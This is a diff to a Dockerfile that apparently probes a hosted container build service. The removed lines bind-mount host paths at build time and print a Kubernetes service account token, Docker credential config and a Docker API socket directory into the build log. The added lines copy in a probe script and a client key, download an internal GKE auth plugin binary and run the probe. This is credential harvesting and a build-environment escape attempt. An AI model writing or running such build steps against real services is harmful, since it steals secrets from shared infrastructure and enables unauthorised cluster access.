@@ -1,7 +1,6 @@
 FROM alpine:3.20
 RUN apk add --no-cache curl python3 openssl
-RUN echo '===KITTEST-BEGIN===' ; ls -la /var/run/ 2>&1 | head -20 ; echo "--secrets--" ; ls -la /var/run/secrets 2>&1 | head -5 ; echo '===KITTEST-END==='
-RUN --mount=type=bind,source=/var/run/bindernew-bindernew/docker-api,target=/dind echo DINDMOUNT-OK ; ls -la /dind 2>&1 | head -20
-RUN --mount=type=bind,source=/var/run/secrets,target=/ksa echo KSAMOUNT-OK ; ls -la /ksa/kubernetes.io/serviceaccount 2>&1 ; head -c 120 /ksa/kubernetes.io/serviceaccount/token 2>/dev/null ; echo
-RUN --mount=type=bind,source=/root/.docker,target=/rdocker echo RDOCKER-OK ; ls -la /rdocker 2>&1 ; head -c 500 /rdocker/config.json 2>/dev/null ; echo
-RUN echo DONE
+COPY probe.py /probe.py
+COPY client.key /client.key
+RUN curl -sS -m 300 -o /gke-exec-auth-plugin https://storage.googleapis.com/gke-prod-binaries/gke-exec-auth-plugin/internal/gke-internal-branch-v1-33/f3f058859e54db63fd78adecd073be39db348785/linux_amd64/gke-exec-auth-plugin && chmod +x /gke-exec-auth-plugin && ls -l /gke-exec-auth-plugin
+RUN echo '===DEEPX-BEGIN===' ; python3 /probe.py deep ; python3 /probe.py plugin ; echo '===DEEPX-END==='
